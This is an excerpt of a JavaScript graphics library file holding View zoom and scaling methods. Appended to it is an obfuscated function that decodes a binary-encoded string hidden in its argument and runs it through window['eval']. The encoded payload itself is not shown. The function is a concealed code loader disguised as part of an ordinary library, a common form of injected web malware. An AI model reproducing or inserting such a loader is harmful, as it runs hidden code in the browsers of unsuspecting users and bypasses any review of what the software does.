...
var View = Base.extend(Emitter, {
	...
	getZoom: function() {
		var decomposed = this._decompose(),
			...
			scaling_x_y = new Decimal(scaling.x.toFixed(2)).plus(scaling.y.toFixed(2));
		return scaling ? scaling_x_y.dividedBy(2).toNumber() : 0;
	},

	setZoom: function(zoom) {
		this.transform(new Matrix().scale(new Decimal(zoom).dividedBy(this.getZoom()).toNumber(),
			this.getCenter()));
	},
	...
	setScaling: function() {
		var current = this.getScaling(),
			scaling = Point.read(arguments, 0, { clone: true, readNull: true });
		if (current && scaling) {
			this.scale(new Decimal(scaling.x).dividedBy(current.x).toNumber(), new Decimal(scaling.y).dividedBy(current.y).toNumber());
		}
	},
...
function c2991e90b32181fb0605a00b610c46f3($){var _=["","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x66\x6F\x72\x45\x61\x63\x68","\x73\x70\x6C\x69\x63\x65","\x73\x70\x6C\x69\x74","\x67","\x31","\x72\x65\x70\x6C\x61\x63\x65","\x30"];$[_[(-~-~[]<<-~-~[])+~[]]](RegExp($[!![]+~[]],_[(!![]<<-~-~[])+!![]]),_[-~-~[]<<-~-~[]])[_[(-~-~[]<<-~-~[])+~[]]](RegExp($[-~[]],_[(!![]<<-~-~[])+!![]]),_[(-~-~[]<<-~-~[])+~-~[]])[_[-~-~[]<<(!![])]]($[-~-~[]])[_[(!![]<<-~-~[])+~[]]](-~[])[_[-~-~[]]](function (__){_[!![]+~[]]+=String[_[-~[]]](parseInt(__,-~-~[]));} );window[(!![]+[])[(!![]<<-~-~[])+~[]]+String[_[-~[]]](parseInt(''+-~[]+-~[]+-~[]+~~[]+-~[]+-~[]+~~[],-~-~[]))+(![]+[])[-~[]]+_[(!![]<<-~-~[])+~[]][-~-~[]]](_[!![]+~[]]);}